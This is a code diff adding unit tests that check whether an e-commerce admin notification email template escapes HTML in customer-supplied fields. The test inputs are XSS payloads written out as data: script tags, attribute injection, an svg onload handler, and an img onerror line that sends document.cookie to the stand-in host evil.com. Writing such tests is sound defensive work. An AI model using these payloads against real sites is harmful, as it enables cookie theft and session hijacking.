@@ -192,4 +192,72 @@ describe('returnAdminNotificationTemplate()', () => {
       expect(html).toContain('Perfumy Gold 50ml');
     });
   });
+
+  // ── XSS — user-supplied fields are HTML-escaped ───────────────────
+
+  describe('XSS — escaping', () => {
+    it('escapes HTML in customerName', () => {
+      const { html } = returnAdminNotificationTemplate({
+        ...BASE_WITHDRAWAL,
+        customerName: '<script>alert(1)</script>',
+      });
+      expect(html).not.toContain('<script>');
+      expect(html).toContain('&lt;script&gt;');
+    });
+
+    it('escapes HTML in email address', () => {
+      const { html } = returnAdminNotificationTemplate({
+        ...BASE_WITHDRAWAL,
+        email: '"onmouseover="alert(1)"@evil.com',
+      });
+      expect(html).not.toContain('"onmouseover="');
+      expect(html).toContain('&quot;');
+    });
+
+    it('escapes HTML in reason text', () => {
+      const { html } = returnAdminNotificationTemplate({
+        ...BASE_COMPLAINT,
+        reason: '<img src=x onerror=fetch("https://evil.com/"+document.cookie)>',
+      });
+      expect(html).not.toContain('<img');
+      expect(html).toContain('&lt;img');
+    });
+
+    it('escapes HTML in phone number', () => {
+      const { html } = returnAdminNotificationTemplate({
+        ...BASE_WITHDRAWAL,
+        phone: '"><svg/onload=alert(1)>',
+      });
+      expect(html).not.toContain('<svg');
+      expect(html).toContain('&lt;svg');
+    });
+
+    it('escapes HTML in bankAccount', () => {
+      const { html } = returnAdminNotificationTemplate({
+        ...BASE_WITHDRAWAL,
+        bankAccount: '<b>not-an-iban</b>',
+      });
+      expect(html).not.toContain('<b>');
+      expect(html).toContain('&lt;b&gt;');
+    });
+
+    it('escapes HTML in item productName', () => {
+      const { html } = returnAdminNotificationTemplate({
+        ...BASE_WITHDRAWAL,
+        items: [{ productName: '<script>evil()</script>', quantity: 1 }],
+      });
+      expect(html).not.toContain('<script>');
+      expect(html).toContain('&lt;script&gt;');
+    });
+
+    it('passes safe customerName through unchanged', () => {
+      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
+      expect(html).toContain('Anna Kowalska');
+    });
+
+    it('passes safe reason through unchanged', () => {
+      const { html } = returnAdminNotificationTemplate(BASE_COMPLAINT);
+      expect(html).toContain('Produkt jest wadliwy');
+    });
+  });
 });
